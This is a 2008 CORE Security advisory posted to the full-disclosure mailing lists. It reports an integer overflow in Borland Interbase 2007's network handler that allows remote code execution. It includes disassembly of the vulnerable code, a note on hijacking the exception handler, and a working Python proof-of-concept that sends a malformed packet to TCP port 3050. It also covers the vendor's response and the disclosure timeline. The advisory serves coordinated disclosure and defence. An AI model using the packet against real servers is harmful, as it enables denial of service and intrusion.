
Date: Tue, 20 May 2008 18:09:40 -0300
From: CORE Security Technologies <advisories@...esecurity.com>
To: Bugtraq <bugtraq@...urityfocus.com>, Vulnwatch <vulnwatch@...nwatch.org>,
	full-disclosure@...ts.grok.org.uk
Subject: CORE-2008-0415: Borland Interbase 2007 Integer
	Overflow

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

~      Core Security Technologies - CoreLabs Advisory
~           http://www.coresecurity.com/corelabs/

~      Borland Interbase 2007 Integer Overflow


*Advisory Information*

Title: Borland Interbase 2007 Integer Overflow
Advisory ID: CORE-2008-0415
Advisory URL: http://www.coresecurity.com/?action=item&id=2278
Date published: 2008-05-20
Date of last update: 2008-05-20
Vendors contacted: Borland
Release mode: Coordinated release


*Vulnerability Information*

Class: Integer Overflow
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: N/A	
CVE Name: N/A	


*Vulnerability Description*

The Borland Interbase 2007 database server [1] is vulnerable to an
integer overflow when a malformed packet is sent to the default TCP port
3050. The integer overflow can cause a stack overflow, which allows
arbitrary code execution with system privileges.


*Vulnerable Packages*

. Borland Interbase 2007 Service Pack 2 (8.1.0.256), Solaris and Windows
versions.


*Non-vulnerable Packages*

. None currently available (see vendor information below).


*Vendor Information, Solutions and Workarounds*

Verbatim from vendor:

"CodeGear is aware of an InterBase security vulnerability that can
expose an InterBase server (running on Microsoft Windows, Linux, Solaris
and Macintosh platforms) to a possible security breach. This
vulnerability is exposed via inside the firewall connections. If an open
port which is connected to an InterBase server is found, and a socket
connection is made to the InterBase server, invalid data can be sent to
the InterBase server which can cause a buffer overflow resulting in a
hang or crash of the InterBase server.

How do I protect my InterBase servers from this security vulnerability?

There are 2 basic steps to protect your InterBase servers from this
vulnerability:

1. The Interbase.log file will give error log information about remote
machines that have invalid connection attempts. You can use this
information to identify such rogue applications and take corrective action.

2. InterBase versions 7.5 and later provide a facility to redefine your
instance of InterBase to use a different TCP port. Use this facility
when you install the product so external rogue applications cannot
connect to a "known" port.

Please consult your security advisors for the best way to protect your
systems.

We are investigating additional solutions to address this vulnerability
and will notify users of any further precautions which may be taken for
additional protection."


*Credits*

This vulnerability was discovered and researched by Damian Frizza, from
CORE IMPACT's Exploit Writing Team (EWT), Core Security Technologies.
Special thanks to Alfredo Ortega. An exploit for this vulnerability will
be shortly available for CORE IMPACT customers.


*Technical Description / Proof of Concept Code*

The Borland Interbase 2007 database server is vulnerable to an integer
overflow when a malformed packet is sent to the default TCP port 3050.
The integer overflow causes a stack overflow, which allows arbitrary
code execution with system privileges.

During the research of a Firebird SQL bug reported earlier by another
party [2] a triggering proof of concept was developed. According to [3],
Firebird SQL started as a fork of Borland's open source release of
InterBase, so the Firebird PoC was also tested on Interbase, triggering
the bug described in this advisory.

1) Solaris version:

This is the vulnerable code section:

/-----------

inet_accept_connection+0x164:   srl       %o5, 0x10, %o7
inet_accept_connection+0x168:   ld        [%l0 + 0xcc], %l1
inet_accept_connection+0x16c:   sth       %o7, [%l1 + 8]
inet_accept_connection+0x170:   ba        +0x3a0
<inet_accept_connection+0x510>
inet_accept_connection+0x174:   ld        [%fp - 0x8c], %g2
inet_accept_connection+0x178:   ld        [%fp - 0x88], %g3
inet_accept_connection+0x17c:   add       %fp, -0x84, %g2
inet_accept_connection+0x180:   st        %g2, [%fp - 0x90]
inet_accept_connection+0x184:   ldsb      [%g3], %g4
inet_accept_connection+0x188:   st        %g4, [%fp - 0xa0]
inet_accept_connection+0x18c:   ld        [%fp - 0x88], %o5
inet_accept_connection+0x190:   add       %o5, 1, %o7
inet_accept_connection+0x194:   st        %o7, [%fp - 0x88]
inet_accept_connection+0x198:   ld        [%fp - 0xa0], %o4
inet_accept_connection+0x19c:   st        %o4, [%fp - 0x304]
inet_accept_connection+0x1a0:   ld        [%fp - 0x304], %l0
inet_accept_connection+0x1a4:   st        %l0, [%fp - 0x308]
inet_accept_connection+0x1a8:   ld        [%fp - 0x308], %l1
inet_accept_connection+0x1ac:   cmp       %l1, 0
inet_accept_connection+0x1b0:   be,a      +0x50
<inet_accept_connection+0x200>
inet_accept_connection+0x1b4:   clr       %g2.

- -----------/

The integer overflow occurs when loading a signed byte from the packet
here:

/-----------

inet_accept_connection+0x184:   ldsb      [%g3], %g4

g4 = 0xffffff80

- -----------/

Then the value overflowing 'g4' is moved to 'l3', and used as a counter

/-----------

inet_accept_connection+0x1b8:   ld        [%fp - 0x88], %g2
inet_accept_connection+0x1bc:   ld        [%fp - 0x90], %g4
inet_accept_connection+0x1c0:   ldsb      [%g2], %g3        *
inet_accept_connection+0x1c4:   stb       %g3, [%g4]        **
inet_accept_connection+0x1c8:   ld        [%fp - 0xa0], %l1
inet_accept_connection+0x1cc:   ld        [%fp - 0x88], %o4
inet_accept_connection+0x1d0:   sub       %l1, 1, %l2
inet_accept_connection+0x1d4:   st        %l2, [%fp - 0xa0]
inet_accept_connection+0x1d8:   add       %o4, 1, %o5
inet_accept_connection+0x1dc:   st        %o5, [%fp - 0x88]
inet_accept_connection+0x1e0:   ld        [%fp - 0xa0], %l3
inet_accept_connection+0x1e4:   cmp       %l3, 0             ***
inet_accept_connection+0x1e8:   ld        [%fp - 0x90], %o7
inet_accept_connection+0x1ec:   add       %o7, 1, %l0
inet_accept_connection+0x1f0:   st        %l0, [%fp - 0x90]
inet_accept_connection+0x1f4:   bne,a     -0x38
<inet_accept_connection+0x1bc>

* g3 point to packet bytes
** copy packet bytes to the stack address pointed by g4
*** loop until l3 = 0

- -----------/

2) Windows version:

In this platform the integer overflow is produced here:

/-----------

0040F605    0FBE11          MOVSX EDX,BYTE PTR DS:[ECX]

- -----------/

And here the packet data is copied from the packet to the stack:

/-----------

0040F62C    880A            MOV BYTE PTR DS:[EDX],CL

- -----------/

In the stack we can see a 0x40 bytes size buffer followed by a pointer
to the source string:

/-----------

00ECF6CC   0000000
00ECF6D0   00000000
00ECF6D4   00000000
00ECF6D8   00000000
00ECF6DC   00000000
00ECF6E0   00000000
00ECF6E4   00000000
00ECF6E8   00000000
00ECF6EC   00000000
00ECF6F0   00000000
00ECF6F4   00000000
00ECF6F8   00000000
00ECF6FC   00000000
00ECF700   00000000
00ECF704   00000000
00ECF708   00000000
00ECF70C   00A9636D  *

* source string pointer

- -----------/

We can write on the Structured Exception Handler taking control of the
program flow if we set a pointer to our data when the loop writes the
source pointer.

The following Python code demonstrates the bug on the default
installation. Replace the IP address '192.168.22.252' with yours. Port
'3050' is the default one.

/-----------

# save as ibserver_poc.py and run it with Python
import socket
import struct

socket = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
socket.connect(("192.168.22.252", 3050))


packet  ='\x00\x00\x00\x01\x00\x00\x00\x13'
packet +='\x00\x00\x00\x05\x00\x00\x00\x1d'
packet +='\x00\x00\x00\x09'
packet += 'B' * 9
packet +='\x00'*6
packet +='\x02\x00\x00'
packet += '\x01\x60'
packet +='\x02'
packet += chr(0x80) # negative byte
packet += 'A' * 1000

socket.send(packet)
socket.close()

- -----------/



*Report Timeline*

. 2008-05-02: Initial notification sent to the vendor, offering the
CORE-2008-0415 advisory draft in plain-text or encrypted.
. 2008-05-05: Vendor acknowledges and requests the draft in plain text.
. 2008-05-05: Core sends the draft.
. 2008-05-09: Vendor requests a more detailed description of the steps
to reproduce the bug.
. 2008-05-09: Core sends a more detailed description of the steps to
reproduce the bug and fixes a bug on the PoC python code.
. 2008-05-09: Vendor confirms the bug has been reproduced.
. 2008-05-14: Vendor sends information for the advisory, including steps
to protect from the vulnerability and considering the issue closed.
. 2008-05-15: Core asks the vendor if the response is final and
communicates that the steps described by the vendor are only ineffective
mitigations that can be bypassed by a skilled attacker (i.e. finding any
new port and erasing the Interbase logs). If the response is final,
advisory  will be published on May 26th as scheduled.
. 2008-05-15: Vendor confirms that the response is final and that any
further information will be notified to the customers.
. 2008-05-15: Core decides and communicates the vendor that the advisory
will be published on May 20th, no further postponement is required by
the coordinating parties.
. 2008-05-20: Advisory CORE-2008-0415 is published.


*References*

[1] Borland Interbase 2007 http://www.codegear.com/products/interbase
[2] Firebird Username Remote Buffer Overflow Vulnerability
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0467
[3] http://en.wikipedia.org/wiki/Firebird_%28database_server%29


*About CoreLabs*

CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
http://www.coresecurity.com/corelabs/.


*About Core Security Technologies*

Core Security Technologies develops strategic solutions that help
security-conscious organizations worldwide develop and maintain a
proactive process for securing their networks. The company's flagship
product, CORE IMPACT, is the most comprehensive product for performing
enterprise security assurance testing. CORE IMPACT evaluates network,
endpoint and end-user vulnerabilities and identifies what resources are
exposed. It enables organizations to determine if current security
investments are detecting and preventing attacks. Core Security
Technologies augments its leading technology solution with world-class
security consulting services, including penetration testing and software
security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
Security Technologies can be reached at 617-399-6980 or on the Web at
http://www.coresecurity.com.


*Disclaimer*

The contents of this advisory are copyright (c) 2008 Core Security
Technologies and (c) 2008 CoreLabs, and may be distributed freely
provided that no fee is charged for this distribution and proper credit
is given.


*GPG/PGP Keys*

This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iEYEARECAAYFAkgzPhQACgkQyNibggitWa0lnwCgiVkAf83Z7p9soVJu8Jc5cKbG
kRgAoKZxEnqud2/0HMPeYdhUeGVuGQRj
=Jqq2
-----END PGP SIGNATURE-----

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
